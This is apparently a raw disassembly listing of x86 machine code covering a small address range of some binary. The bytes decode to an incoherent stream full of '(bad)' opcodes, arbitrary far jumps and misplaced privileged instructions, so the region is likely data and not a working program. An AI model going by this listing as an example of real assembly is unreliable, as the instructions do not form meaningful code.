  429682:	dec    esi
  429683:	sahf   
  429684:	push   ebp
  429685:	mov    ebx,0x1050001
  42968a:	add    BYTE PTR [eax],al
  42968c:	stc    
  42968d:	mov    ebx,DWORD PTR [edx]
  42968f:	jmp    0x429626
  429691:	push   esi
  429692:	pop    esp
  429693:	cwde   
  429694:	xchg   edx,eax
  429695:	mov    ds:0xa08091b1,al
  42969a:	pop    es
  42969b:	fild   WORD PTR [ebp+0x4f]
  42969e:	adc    al,0x64
  4296a0:	and    al,0x60
  4296a2:	(bad)  
  4296a4:	xchg   ebx,eax
  4296a5:	mov    edx,0xb34c191d
  4296aa:	rol    BYTE PTR [eax+0x687654d8],0x94
  4296b1:	cmp    al,0xc9
  4296b3:	(bad)  
  4296b4:	lahf   
  4296b5:	into   
  4296b6:	jmp    0x87e9:0xb3e8a286
  4296bd:	or     eax,0xb3a95f40
  4296c2:	scas   eax,DWORD PTR es:[edi]
  4296c3:	enter  0xc4b0,0xbc
  4296c7:	dec    esi
  4296c8:	jb     0x4296bf
  4296ca:	pop    es
  4296cb:	jl     0x429719
  4296cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4296ce:	imul   esi,DWORD PTR [edi+0x39fbdd5c],0x42
  4296d5:	push   ds
  4296d6:	das    
  4296d7:	mul    eax
  4296d9:	ficom  DWORD PTR [ecx+0x5d]
  4296dc:	sbb    DWORD PTR [esi+0x5a],0xbaf317d0
  4296e3:	sbb    DWORD PTR [edi+ebx*4-0x2],eax
  4296e7:	inc    esp
  4296e8:	xor    esp,DWORD PTR [eax+ecx*8-0x4fa21ee5]
  4296ef:	lds    esi,FWORD PTR [edi-0x7f]
  4296f2:	sbb    DWORD PTR [ecx+ebp*8-0x3f],ebp
  4296f6:	add    al,0x80
  4296f8:	bound  ebp,QWORD PTR [eax]
  4296fa:	test   al,0x5d
  4296fc:	xor    BYTE PTR [ecx],0x51
  4296ff:	jbe    0x429709
  429701:	push   edi
  429702:	inc    esi
  429703:	adc    eax,0x2c4e5fc5
  429708:	push   esp
  429709:	inc    esp
  42970a:	mov    edi,0xa037f738
  42970f:	inc    edi
  429710:	test   al,0x8e
  429712:	loope  0x4296e9
  429714:	out    dx,al
  429715:	xchg   ebp,eax
  429716:	retf   0x6525
  429719:	cvttps2pi mm5,xmm3
  42971c:	sbb    BYTE PTR [edx],0x39
  42971f:	push   ebp
  429720:	das    
  429721:	rcl    BYTE PTR [ebx+0x3a],cl
  429724:	frstor [edx+ecx*8+0x1b2e9005]
  42972b:	add    esp,ecx
  42972d:	xchg   edi,eax
  42972e:	dec    esp
  42972f:	dec    edi
  429730:	push   es
  429731:	mov    ah,0xa3
  429733:	sti    
  429734:	hlt    
  429735:	in     eax,dx
  429736:	cld    
  429737:	sub    al,0x27
  429739:	sti    
  42973a:	adc    DWORD PTR [esp+ebx*2-0x79f55553],edx
  429741:	and    eax,0x8712d59b
  429746:	adc    al,BYTE PTR [ebx]
  429748:	jne    0x4297a0
  42974a:	fcmovb st,st(2)
  42974c:	test   eax,0x3f987b1
  429751:	mov    al,ds:0x267962e6
  429756:	loope  0x429784
  429758:	or     esi,DWORD PTR [esp+ebx*4]
  42975b:	add    edx,DWORD PTR [ebx]
  42975d:	jge    0x42971d
  42975f:	push   esi
  429760:	and    eax,0x8a2a1251
  429765:	mov    ecx,0x534276f0
  42976a:	out    0xf,al
  42976c:	inc    edx
  42976d:	outs   dx,BYTE PTR ds:[esi]
  42976e:	(bad)  
  42976f:	fisubr DWORD PTR [edx]
  429771:	xchg   esi,eax
  429772:	add    DWORD PTR [ecx+0x59],ecx
  429775:	fld    QWORD PTR [edx]
  429777:	arpl   WORD PTR [eax-0x2ef1634],dx
  42977d:	rdmsr  
  42977f:	dec    ecx
  429780:	out    dx,eax
  429781:	jae    0x4297f1
  429783:	dec    esi
  429784:	in     al,dx
  429785:	add    DWORD PTR [esi+0x1ff3e696],ebp
  42978b:	xor    BYTE PTR [edx+0x2],0x5
  42978f:	inc    ebp
  429790:	mov    DWORD PTR [eax],0x0
	...
  4297f2:	add    BYTE PTR [eax],al
  4297f4:	xor    BYTE PTR [edx-0x21],al
  4297f7:	(bad)  
  4297f8:	(bad)  
  4297f9:	(bad)  
  4297fa:	mov    ebp,0x1d164c52
  4297ff:	pop    ebp
  429800:	out    0xb3,al
  429802:	mov    ecx,0x1bc5a8b
  429807:	add    BYTE PTR ds:0x92000001,al
  42980d:	jmp    0x429822
  42980f:	or     al,0x20
  429811:	int    0x5d
  429813:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429814:	sar    DWORD PTR [ebp-0x1599d3ef],0x6a
  42981b:	dec    edi
  42981c:	lods   eax,DWORD PTR ds:[esi]
  42981d:	je     0x4297a4
  42981f:	add    edx,DWORD PTR [bp+0xc]
  429823:	mov    ds:0xffdc8b3,al
  429828:	push   0xffffffbd
  42982a:	push   edi
  42982b:	rol    DWORD PTR [ecx],1
  42982d:	and    eax,0xfb0470f3
  429832:	lahf   
  429833:	push   edx
  429834:	es retf 0x3359
  429838:	fsub   QWORD PTR ds:0x2bb81d2b
  42983e:	imul   eax,eax,0xc2149f75
  429844:	sub    al,0x7c
  429846:	rcl    DWORD PTR [esi+0x44cae593],1
  42984c:	mov    cl,0x5f
  42984e:	pop    edx
  42984f:	mov    ah,0xcd
  429851:	cli    
  429852:	add    DWORD PTR [edi+0x64],esp
  429855:	jne    0x42982b
  429857:	mov    cl,0xb1
  429859:	mov    cl,0x90
  42985b:	jmp    0x1eb6:0xb4c0ef7a
  429862:	xor    ebp,DWORD PTR [ecx]
  429864:	je     0x4298bc
  429866:	aad    0x1f
  429868:	mov    DWORD PTR [esi+0x24],esi
  42986b:	or     eax,0x5ad1f526
  429870:	jp     0x429807
  429872:	pop    ebx
  429873:	into   
  429874:	jle    0x4298d8
  429876:	ja     0x429845
  429878:	xchg   esp,eax
  429879:	or     BYTE PTR [esi],ch
  42987b:	pop    es
  42987c:	mov    ch,BYTE PTR [eax-0xe]
  42987f:	push   edi
  429880:	pop    ebp
  429881:	adc    al,ch
  429883:	test   DWORD PTR [edx],ebp
  429885:	jmp    0x4298ec
  429887:	call   DWORD PTR [ebx]
  429889:	inc    ebp
  42988a:	sbb    cl,dl
  42988c:	mov    edi,0x74173820
  429891:	jp     0x429829
  429893:	push   ds
  429894:	or     al,0x56
  429896:	push   ds
  429897:	loopne 0x4298b7
  429899:	dec    edx
  42989a:	stc    
  42989b:	sbb    DWORD PTR [eax],eax
  42989d:	ror    BYTE PTR [edi],0xe7
  4298a0:	jae    0x42985b
  4298a2:	adc    BYTE PTR [ebx],cl
  4298a4:	(bad)  
  4298a5:	idiv   eax
  4298a7:	and    bh,BYTE PTR [eax+0x41b1a452]
  4298ad:	mov    ecx,0x9b92c244
  4298b2:	std    
  4298b3:	push   es
  4298b4:	pop    eax
  4298b5:	sub    al,0x5f
  4298b7:	and    DWORD PTR [eax],esi
  4298b9:	sti    
  4298ba:	pop    edi
  4298bb:	es push es
  4298bd:	fcompp 
  4298bf:	jmp    0x8e78:0x68c5500f
  4298c6:	clc    
  4298c7:	jl     0x429907
  4298c9:	sbb    BYTE PTR [edi-0xc],ah
  4298cc:	pop    ecx
  4298cd:	inc    DWORD PTR [ebx]
  4298cf:	xchg   esp,eax
  4298d0:	cli    
  4298d1:	mov    al,ds:0xbeb04a0f
  4298d6:	inc    ebp
  4298d7:	ret    
  4298d8:	ins    BYTE PTR es:[edi],dx
  4298d9:	repz (bad) 
  4298db:	cld    
  4298dc:	ret    
  4298dd:	mov    ds:0xf459dd27,eax
  4298e2:	xchg   DWORD PTR [ebx-0x59],edx
  4298e5:	stc    
  4298e6:	cmc    
  4298e7:	aam    0x54
  4298e9:	js     0x429891
  4298eb:	and    eax,0xfeee7a3
  4298f0:	mov    bh,0x4f
  4298f2:	mov    esi,0x3a81c8ad
  4298f7:	xor    dh,BYTE PTR [esi+0x6466211a]
  4298fd:	mov    ah,BYTE PTR [edi+0x6171d87]
  429903:	mov    al,ds:0x1f54f6cf
  429908:	stc    
  429909:	xchg   BYTE PTR [ebx-0x2f3ab4e2],bh
  42990f:	shr    BYTE PTR [ebx+0x0],1
	...
  429971:	add    BYTE PTR [eax],al
  429973:	add    BYTE PTR [edi+0x68],dl
  429976:	fistp  QWORD PTR fs:[edi-0x21]
  42997a:	(bad)  
  42997b:	call   0x3b7e6d73
  429980:	adc    BYTE PTR [esi-0x42a0916f],dh
  429986:	add    DWORD PTR [eax],eax
  429988:	add    eax,0x6e000001
  42998d:	in     eax,0x1f
  42998f:	ds jle 0x4299f8
  429992:	mov    dh,0xa6
  429994:	popf   
  429995:	or     ecx,esi
  429997:	cmp    BYTE PTR [edx],0x38
  42999a:	sub    BYTE PTR [ecx-0x73b05cbe],bh
  4299a0:	jecxz  0x4299bb
  4299a2:	fisttp WORD PTR [edi-0x2482172]
  4299a8:	xchg   esi,eax
  4299a9:	adc    eax,ebx
  4299ab:	in     eax,dx
  4299ac:	aas    
  4299ad:	push   ebp
  4299ae:	push   ecx
  4299af:	enter  0xd1c4,0x5a
  4299b3:	fmul   st(6),st
  4299b5:	enter  0xeef5,0x2a
  4299b9:	xchg   esp,eax
  4299ba:	je     0x429a1e
  4299bc:	call   0xea9f7586
  4299c1:	pop    esp
  4299c2:	es jmp 0x75b0:0x314d384c
  4299ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4299cb:	pop    ecx
  4299cc:	cli    
  4299cd:	les    edx,FWORD PTR gs:[esi]
  4299d0:	(bad)  
  4299d1:	jae    0x4299a9
  4299d3:	shr    DWORD PTR [ebp+0x55fa5f62],cl
  4299d9:	or     DWORD PTR [esi],esp
  4299db:	push   eax
  4299dc:	and    eax,0xfd900c7e
  4299e1:	popa   
  4299e2:	mov    cl,BYTE PTR [ecx-0x71c82279]
  4299e8:	adc    al,0xd0
  4299ea:	inc    ebp
  4299eb:	xchg   edi,eax
  4299ec:	mov    ds:0x18d7547a,eax
  4299f1:	sub    al,0xad
  4299f3:	(bad)  
  4299f4:	scas   al,BYTE PTR es:[edi]
  4299f5:	loop   0x429a39
  4299f7:	dec    ebx
  4299f8:	scas   al,BYTE PTR es:[edi]
  4299f9:	mov    ebx,0xca02987
  4299fe:	shl    BYTE PTR [edi+ecx*4-0x3b],1
  429a02:	mov    dl,0xb1
  429a04:	sbb    al,0x2e
  429a06:	xchg   ebp,eax
  429a07:	outs   dx,BYTE PTR ds:[esi]
  429a08:	mov    bh,0x2c
  429a0a:	retf   
  429a0b:	mov    bl,0xb9
  429a0d:	cmc    
  429a0e:	and    DWORD PTR [ebx],0x1c
  429a11:	jmp    0x8c33:0x8a2749bc
  429a18:	stos   BYTE PTR es:[edi],al
  429a19:	jecxz  0x429a5f
  429a1b:	enter  0xd562,0x70
  429a1f:	push   edi
  429a20:	jo     0x429a5c
  429a22:	mov    bl,0xd4
  429a24:	sahf   
  429a25:	test   eax,0x2769e1bb
  429a2a:	mov    ss,WORD PTR [edx-0x6e]
  429a2d:	cmp    eax,0x56f85c98
  429a32:	das    
  429a33:	and    BYTE PTR [ebp-0x11575281],bl
  429a39:	fld    TBYTE PTR [edx-0x69]
  429a3c:	inc    edi
  429a3d:	sbb    eax,0x674a773
  429a42:	xor    BYTE PTR [ebp+0x68647ac3],bh
  429a48:	mov    bh,0x89
  429a4a:	sar    dl,cl
  429a4c:	das    
  429a4d:	sub    eax,0x5db4c58e
  429a52:	jne    0x429a7d
  429a54:	add    BYTE PTR [edi],cl
  429a56:	mov    ecx,0x39030658
  429a5b:	and    al,0xaa
  429a5d:	xor    ebp,DWORD PTR [ebx]
  429a5f:	inc    eax
  429a60:	aad    0x1a
  429a62:	ins    BYTE PTR es:[edi],dx
  429a63:	(bad)  
  429a64:	repz inc ecx
  429a66:	jmp    0x3bfb:0x2c6b11e4
  429a6d:	xor    DWORD PTR [ecx+0x296cccda],eax
  429a73:	xchg   edi,eax
  429a74:	inc    edi
  429a75:	pushf  
  429a76:	fist   DWORD PTR [ebx-0x15]
  429a79:	xor    eax,0x65b1e024
  429a7e:	jg     0x429a83
  429a80:	mov    BYTE PTR [ecx-0x5a],cl
  429a83:	mov    bl,0x45
  429a85:	pop    edx
  429a86:	jle    0x429ada
  429a88:	cmp    eax,0x699f3c31
  429a8d:	lock inc ebp
  429a8f:	imul   edi,DWORD PTR [esi+0x0],0x0
	...
  429af2:	add    BYTE PTR [eax],al
  429af4:	into   
  429af5:	std    
  429af6:	sti    
  429af7:	leave  
  429af8:	sti    
  429af9:	iret   
  429afa:	(bad)  
  429afb:	jmp    DWORD PTR ds:0xa7a95667
  429b01:	jns    0x429ad0
  429b03:	sub    esp,DWORD PTR [esi+edi*4+0x1]
  429b07:	add    BYTE PTR ds:0xd9000001,al
  429b0d:	repnz sbb esp,DWORD PTR [ecx-0x1dc894c2]
  429b14:	inc    esp
  429b15:	jnp    0x429b25
  429b17:	mov    dl,0x10
  429b19:	or     edi,DWORD PTR [ebx+eax*8-0x60bc9ef5]
  429b20:	iret   
  429b21:	stos   DWORD PTR es:[edi],eax
  429b22:	sub    esi,DWORD PTR [esi+0xc2ff5d0]
  429b28:	inc    eax
  429b29:	mov    esi,0x7981d1e
  429b2e:	or     DWORD PTR [eax],ecx
  429b30:	test   al,0xc9
  429b32:	or     al,0x99
  429b34:	jmp    0x429b8c
  429b36:	(bad)  
  429b37:	loop   0x429b27
  429b39:	jle    0x429b3a
  429b3b:	bound  esp,QWORD PTR [edx+ebx*8-0x1a]
  429b3f:	mov    al,0x93
  429b41:	inc    eax
  429b42:	adc    cl,BYTE PTR [edx+0x1868cd1e]
  429b48:	scas   eax,DWORD PTR es:[edi]
  429b49:	mov    ds:0x4121c254,al
  429b4e:	test   BYTE PTR [edx-0x41],bl
  429b51:	ror    DWORD PTR [ebx+0x18],cl
  429b54:	and    eax,DWORD PTR [ebp+0x1b]
  429b57:	or     cl,dl
  429b59:	imul   ch
  429b5b:	adc    DWORD PTR [ebx],0xffffff93
  429b5e:	enter  0xfb72,0x7c
  429b62:	int3   
  429b63:	and    cl,BYTE PTR [ecx]
  429b65:	pop    es
  429b66:	not    DWORD PTR [eax-0x20efe024]
  429b6c:	fld    DWORD PTR [esi+0x6f]
  429b6f:	jo     0x429b61
  429b71:	aam    0x93
  429b73:	lods   eax,DWORD PTR ds:[esi]
  429b74:	adc    eax,0x7b068ba3
  429b79:	js     0x429b6c
  429b7b:	cmp    al,BYTE PTR [ebx-0x217d12f0]
  429b81:	out    0x71,al
  429b83:	mov    edi,0x718c1897
  429b88:	scas   eax,DWORD PTR es:[edi]
  429b89:	es retf 
  429b8b:	fs jmp 0x429bf6
  429b8e:	pusha  
  429b8f:	ret    0xaf93
  429b92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429b93:	enter  0x2ac0,0x24
  429b97:	dec    eax
  429b98:	or     bl,dh
  429b9a:	sahf   
  429b9b:	push   ebx
  429b9c:	add    esi,DWORD PTR [ebx-0x25]
  429b9f:	mov    ds:0x76d444e3,al
  429ba4:	mov    al,ds:0xa1f95f44
  429ba9:	jo     0x429b40
  429bab:	ror    DWORD PTR [eax+0x78],cl
  429bae:	in     eax,dx
  429baf:	cmp    eax,0xba7bf263
  429bb4:	dec    esi
  429bb5:	cld    
  429bb6:	inc    edx
  429bb7:	push   cs
  429bb8:	jns    0x429bec
  429bba:	repnz dec esp
  429bbc:	mov    bl,0xd8
  429bbe:	mov    ecx,0x40b725be
  429bc3:	sbb    eax,0xfd400c77
  429bc8:	cs dec esi
  429bca:	cmp    DWORD PTR [edx],0x31d10567
  429bd0:	cmp    BYTE PTR [edx],0x72
  429bd3:	jno    0x429c49
  429bd5:	xor    eax,0x96fd118e
  429bda:	ja     0x429bf7
  429bdc:	ret    0x726e
  429bdf:	or     al,0x16
  429be1:	shr    ch,1
  429be3:	cs out 0xfd,al
  429be6:	mov    dh,0x23
  429be8:	inc    ecx
  429be9:	xor    cl,al
  429beb:	lahf   
  429bec:	js     0x429b73
  429bee:	jne    0x429ba5
  429bf0:	jb     0x429c64
  429bf2:	sar    DWORD PTR [edx+0x1fda91d3],1
  429bf8:	ss fwait
  429bfa:	cmp    DWORD PTR [edx-0x9ffd1b0],edi
  429c00:	out    0x8b,eax
  429c02:	repz xchg esp,eax
  429c04:	arpl   WORD PTR [esi],si
  429c06:	and    al,0x88
  429c08:	fadd   DWORD PTR [di-0x948]
  429c0d:	sub    ecx,eax
  429c0f:	jl     0x429bf5
	...
  429c71:	add    BYTE PTR [eax],al
  429c73:	add    BYTE PTR [ebx-0x487759ea],ah
  429c79:	mov    eax,0x89413faf
  429c7e:	(bad)  
  429c7f:	xor    BYTE PTR [ebx+edi*2-0x2c],dl
  429c83:	add    DWORD PTR [ecx-0x41],ebp
  429c86:	add    DWORD PTR [eax],eax
  429c88:	add    eax,0xe5000001
  429c8d:	fcom   DWORD PTR [esi+0x4536a45f]
  429c93:	fmul   st(7),st
  429c95:	mov    ebx,DWORD PTR [ecx]
  429c97:	inc    esi
  429c98:	aas    
  429c99:	adc    edx,ebx
  429c9b:	dec    eax
  429c9c:	pusha  
  429c9d:	inc    eax
  429c9e:	or     DWORD PTR [ebp+ebx*1+0x1],esi
  429ca2:	jne    0x429cde
  429ca4:	pop    eax
  429ca5:	daa    
  429ca6:	and    BYTE PTR [edi],al
  429ca8:	aaa    
  429ca9:	mov    edx,0x89366765
  429cae:	mov    dl,0x92
  429cb0:	das    
  429cb1:	inc    DWORD PTR [edi+0x5c364d57]
  429cb7:	mov    al,ds:0xaabc98f9
  429cbc:	mov    cl,0xd
  429cbe:	fcomp  QWORD PTR [esi+ebp*4]
  429cc1:	inc    esp
  429cc2:	cmp    cl,BYTE PTR [ecx-0x3d6c4053]
  429cc8:	xor    cl,0x77
  429ccb:	stos   DWORD PTR es:[edi],eax
  429ccc:	mov    edi,0x1d030687
  429cd1:	jg     0x429c6c
  429cd3:	push   ds
  429cd4:	call   0x7fbcefa4
  429cd9:	mov    BYTE PTR [edx-0xeac6271],bh
  429cdf:	dec    ecx
  429ce0:	mov    esp,0x76650048
  429ce5:	retf   0xc012
  429ce8:	cmp    eax,0x50d4dea0
  429ced:	loope  0x429ceb
  429cef:	pop    esi
  429cf0:	push   es
  429cf1:	call   0xf3dfb19b
  429cf6:	lock dec ebp
  429cf8:	mov    ch,BYTE PTR [eax]
  429cfa:	sbb    eax,0x110f8006
  429cff:	in     eax,0xf9
  429d01:	xchg   esi,eax
  429d02:	rcl    DWORD PTR [ecx+0x5305cb37],cl
  429d08:	fcom   QWORD PTR [esi+edi*2]
  429d0b:	mov    al,BYTE PTR ds:0x4b5e4ea1
  429d11:	ficom  DWORD PTR [ebp+0x1b8e3d9a]
  429d17:	inc    eax
  429d18:	in     al,dx
  429d19:	gs cld 
  429d1b:	cli    
  429d1c:	in     al,dx
  429d1d:	es cmp al,0xd7
  429d20:	jne    0x429ce2
  429d22:	mov    esi,0x4c005164
  429d27:	sub    eax,0xbe92c804
  429d2c:	push   0x38f31d50
  429d31:	cmp    DWORD PTR [eax*2-0x398fa65b],ebx
  429d38:	test   BYTE PTR [esi],al
  429d3a:	or     dl,BYTE PTR [ebp-0x7c834a92]
  429d40:	jbe    0x429ce8
  429d42:	jp     0x429d2c
  429d44:	call   0x7a657393
  429d49:	sub    ah,BYTE PTR [ebx-0x6baf6fb3]
  429d4f:	inc    ecx
  429d50:	cmp    ecx,DWORD PTR [eax+0xbe74e5b]
  429d56:	jecxz  0x429dc5
  429d58:	jns    0x429ce4
  429d5a:	mov    sp,WORD PTR [esi-0xa]
  429d5e:	ins    DWORD PTR es:[edi],dx
  429d5f:	push   0xc337a398
  429d64:	dec    edi
  429d65:	dec    ecx
  429d67:	aam    0x49
  429d69:	popf   
  429d6a:	xchg   DWORD PTR [ebx+0xdfacbbb],ebp
  429d70:	cli    
  429d71:	lock stos BYTE PTR es:[edi],al
  429d73:	mov    esi,0x6f7cf485
  429d78:	push   ecx
  429d79:	cli    
  429d7a:	push   es
  429d7b:	sub    BYTE PTR [ebx+ebx*8],dl
  429d7e:	outs   dx,BYTE PTR ds:[si]
  429d80:	test   eax,0x65395f2d
  429d85:	xchg   edi,eax
  429d86:	dec    ecx
  429d87:	ret    0x8d48
  429d8a:	mov    dh,0x35
  429d8c:	jne    0x429d80
  429d8e:	in     al,dx
  429d8f:	push   esi
  429d90:	lea    eax,[eax]
	...
  429df2:	add    BYTE PTR [eax],al
  429df4:	fwait
  429df5:	mov    bh,0xc4
  429df7:	or     al,0xec
  429df9:	jg     0x429dd6
  429dfb:	mov    bh,0xe1
  429dfd:	sahf   
  429dfe:	loop   0x429e68
  429e00:	leave  
  429e01:	test   ch,ch
  429e03:	cmp    DWORD PTR [esi-0x40],ebp
  429e06:	add    DWORD PTR [eax],eax
  429e08:	add    eax,0x55000001
  429e0d:	and    DWORD PTR [ebx],esi
  429e0f:	or     eax,0xb56ebdd6
  429e14:	je     0x429e82
  429e16:	loop   0x429db1
  429e18:	xchg   esp,eax
  429e19:	or     al,0x57
  429e1b:	test   BYTE PTR [edi+edx*4+0x6d],0xa0
  429e20:	call   0x9147c661
  429e25:	cmp    bh,BYTE PTR [ebp-0x78]
  429e28:	adc    DWORD PTR [ebx-0x4e82aeaa],edi
  429e2e:	xchg   esi,eax
  429e2f:	pop    ds
  429e30:	inc    ebx
  429e31:	aam    0x9c
  429e33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429e34:	into   
  429e35:	frstor [edx]
  429e37:	jmp    0xd872c977
  429e3c:	mov    ecx,ss
  429e3e:	cmp    DWORD PTR [esi-0x618acffa],edx
  429e44:	aas    
  429e45:	mov    ecx,edx
  429e47:	mov    edi,0x7bdb57b4
  429e4c:	mov    ah,0xb3
  429e4e:	cmp    dh,bh
  429e50:	fiadd  DWORD PTR [esi]
  429e52:	sbb    ch,bh
  429e54:	xchg   ebp,eax
  429e55:	ss arpl bx,cx
  429e58:	sub    eax,0x632390f4
  429e5d:	pop    eax
  429e5e:	clc    
  429e5f:	jge    0x429e79
  429e61:	sub    eax,0x134e5950
  429e66:	leave  
  429e67:	sbb    al,0x1b
  429e69:	aaa    
  429e6a:	mov    ecx,0x7fcd86c9
  429e6f:	jge    0x429df4
  429e71:	(bad)  
  429e72:	push   esp
  429e73:	imul   ebp,DWORD PTR [eax],0xa3a04e3
  429e79:	sub    esi,ebp
  429e7b:	pop    ss
  429e7c:	xor    bh,0x35
  429e7f:	icebp  
  429e80:	js     0x429e49
  429e82:	mov    dl,0x7f
  429e84:	and    ah,BYTE PTR [esi+0x2b382621]
  429e8a:	xor    eax,0x57c77162
  429e8f:	(bad)  
  429e90:	aaa    
  429e91:	jnp    0x429ed0
  429e93:	inc    ebp
  429e94:	or     esp,eax
  429e96:	jmp    0xb716:0x5fb4a0aa
  429e9d:	xchg   ebp,eax
  429e9e:	cmp    dh,ch
  429ea0:	repz (bad) 
  429ea2:	out    dx,al
  429ea3:	cld    
  429ea4:	dec    esp
  429ea5:	nop
  429ea6:	push   ebx
  429ea7:	iret   
  429ea8:	outs   dx,BYTE PTR ds:[esi]
  429ea9:	push   edx
  429eaa:	hlt    
  429eab:	jns    0x429e7c
  429ead:	jb     0x429ec6
  429eaf:	cmc    
  429eb0:	std    
  429eb1:	mov    BYTE PTR [eax],0xe8
  429eb4:	shr    BYTE PTR [edi],1
  429eb6:	and    DWORD PTR [eax-0x1e],ecx
  429eb9:	lahf   
  429eba:	ds inc ebx
  429ebc:	in     eax,0x93
  429ebe:	enter  0x9d2a,0x52
  429ec2:	push   es
  429ec3:	push   esi
  429ec4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429ec5:	call   0x8258:0xc0f23904
  429ecc:	adc    al,0xc0
  429ece:	and    al,0xb1
  429ed0:	fild   QWORD PTR [edx-0x6ced72e]
  429ed6:	mov    dh,0x84
  429ed8:	xchg   ecx,eax
  429ed9:	sub    BYTE PTR [ecx+0x48],al
  429edc:	add    cl,BYTE PTR [esi-0x2a]
  429edf:	or     ebx,DWORD PTR [ebp-0xa39841b]
  429ee5:	(bad)  
  429ee6:	jae    0x429f0f
  429ee8:	ret    0x3ebb
  429eeb:	dec    ecx
  429eec:	fs cmc 
  429eee:	add    BYTE PTR ds:0x523fc44f,ch
  429ef4:	xchg   edi,eax
  429ef5:	cwde   
  429ef6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429ef7:	ja     0x429ea5
  429ef9:	add    BYTE PTR [eax-0x235d2808],bh
  429eff:	out    0x8a,eax
  429f01:	pop    ebx
  429f02:	mov    eax,0x9e2e60b4
  429f07:	scas   eax,DWORD PTR es:[edi]
  429f08:	test   BYTE PTR [eax-0x5d],0x4d
  429f0c:	mov    eax,0x1b166a43
	...
  429f71:	add    BYTE PTR [eax],al
  429f73:	add    BYTE PTR [ecx],dh
  429f75:	inc    ebp
  429f76:	enter  0xfc06,0x8f
  429f7a:	push   DWORD PTR [edi-0x50]
  429f7d:	cld    
  429f7e:	sbb    esp,DWORD PTR [ebx-0x6687ae5c]
  429f84:	jae    0x429f47
  429f86:	add    DWORD PTR [eax],eax
  429f88:	add    eax,0x4b000001
  429f8d:	inc    esi
  429f8e:	pop    es
  429f8f:	mov    edx,0xf531d3ef
  429f94:	stos   BYTE PTR es:[edi],al
  429f95:	stos   BYTE PTR es:[edi],al
  429f96:	fsub   st,st(5)
  429f98:	in     eax,dx
  429f99:	aaa    
  429f9a:	cmp    bh,BYTE PTR [edi+ebx*8-0x64]
  429f9e:	mov    ds:0x9a0d5945,eax
  429fa3:	f2xm1  
  429fa5:	xor    DWORD PTR [ebx],0x9ac0d24d
  429fab:	imul   ecx
  429fad:	sahf   
  429fae:	mov    ds:0xf72e447e,al
  429fb3:	aam    0x44
  429fb5:	(bad)  
  429fb6:	out    0xc9,al
  429fb8:	sti    
  429fb9:	cmp    eax,0xe6994272
  429fbe:	mov    ecx,DWORD PTR gs:[edx-0x73017f1f]
  429fc5:	hlt    
  429fc6:	enter  0xd405,0x9e
  429fca:	cwde   
  429fcb:	rcl    DWORD PTR [ebx],1
  429fcd:	std    
  429fce:	mov    bl,0xea
  429fd0:	fwait
  429fd1:	sbb    dl,bh
  429fd3:	push   edi
  429fd4:	xchg   DWORD PTR [esp+eax*8],ebx
  429fd7:	cmp    ebp,edx
  429fd9:	leave  
  429fda:	repz addr16 fwait
  429fdd:	add    DWORD PTR [eax+0x1c],edx
  429fe0:	xor    al,0xbe
  429fe2:	sbb    esi,ebx
  429fe4:	rcr    DWORD PTR [edx],0x3c
  429fe7:	jo     0x42a066
  429fe9:	cmc    
  429fea:	and    esi,DWORD PTR [ebp-0x2d]
  429fed:	inc    esi
  429fee:	mov    edi,0x98fec9ad
  429ff3:	adc    al,0x73
  429ff5:	(bad)  
  429ff6:	jnp    0x429f99
  429ff8:	mov    eax,0x64351459
  429ffd:	icebp  
  429ffe:	fnsave [edx+0x383998f8]
  42a004:	shl    BYTE PTR [ebp+0x61bda882],cl
  42a00a:	lea    esi,[edx+0x4a]
  42a00d:	mov    esi,DWORD PTR [edx+0x2030146d]
  42a013:	out    0xcc,al
  42a015:	into   
  42a016:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a017:	into   
  42a018:	jb     0x429ffd
  42a01a:	xchg   ebx,eax
  42a01b:	push   ebx
  42a01c:	pusha  
  42a01d:	fdivr  st,st(0)
  42a01f:	mov    edi,DWORD PTR [ebx-0x54acea60]
  42a025:	sbb    eax,0x4ba84a4d
  42a02a:	push   ds
  42a02b:	or     eax,0xff5dbc5b
  42a030:	jns    0x42a035
  42a032:	cmp    edx,ebx
  42a034:	mov    ch,BYTE PTR [edi+0x57970c3]
  42a03a:	pop    ss
  42a03b:	sub    DWORD PTR [edi+0x20],0xb8bde8aa
  42a042:	out    dx,al
  42a043:	les    edi,FWORD PTR [ebp-0x3b]
  42a046:	push   esi
  42a047:	outs   dx,DWORD PTR ds:[esi]
  42a048:	sbb    BYTE PTR [edx-0x7fb1dd17],bl
  42a04e:	fldcw  WORD PTR [ebx-0x5c]
  42a051:	mov    bl,0x7b
  42a053:	xchg   edx,eax
  42a054:	add    BYTE PTR [eax+edi*4-0x17b3490b],dh
  42a05b:	jo     0x42a040
  42a05d:	mov    eax,ds:0x193cf7ac
  42a062:	repz jae 0x42a079
  42a065:	enter  0x63fb,0xed
  42a069:	lds    ebp,FWORD PTR ds:0x502dfbb1
  42a06f:	xor    al,0x97
  42a071:	lods   eax,DWORD PTR ds:[esi]
  42a072:	das    
  42a073:	in     eax,dx
  42a074:	std    
  42a075:	loope  0x42a0a9
  42a077:	fst    QWORD PTR [ecx+0x76215887]
  42a07d:	cli    
  42a07e:	dec    esp
  42a07f:	repz dec esi
  42a081:	xchg   esp,eax
  42a082:	aaa    
  42a083:	jae    0x42a053
  42a085:	jb     0x42a01a
  42a087:	xlat   BYTE PTR ds:[ebx]
  42a088:	mov    edi,0xb4f1022f
  42a08d:	or     DWORD PTR [edx],ebx
  42a08f:	xchg   edx,eax
  42a090:	add    BYTE PTR cs:[eax],al
	...
  42a0f3:	add    bh,dl
  42a0f5:	pushf  
  42a0f6:	shr    BYTE PTR [ebp-0x1000235],0xdb
  42a0fd:	call   FWORD PTR [ebx]
  42a0ff:	(bad)  
  42a100:	cli    
  42a101:	adc    bh,BYTE PTR [esp+ebx*2]
  42a104:	js     0x42a0c8
  42a106:	add    DWORD PTR [eax],eax
  42a108:	add    eax,0xf2000001
  42a10d:	jae    0x42a12a
  42a10f:	in     al,dx
  42a110:	or     al,0xa7
  42a112:	scas   eax,DWORD PTR es:[edi]
  42a113:	adc    eax,0xa1438bf2
  42a118:	iret   
  42a119:	push   edx
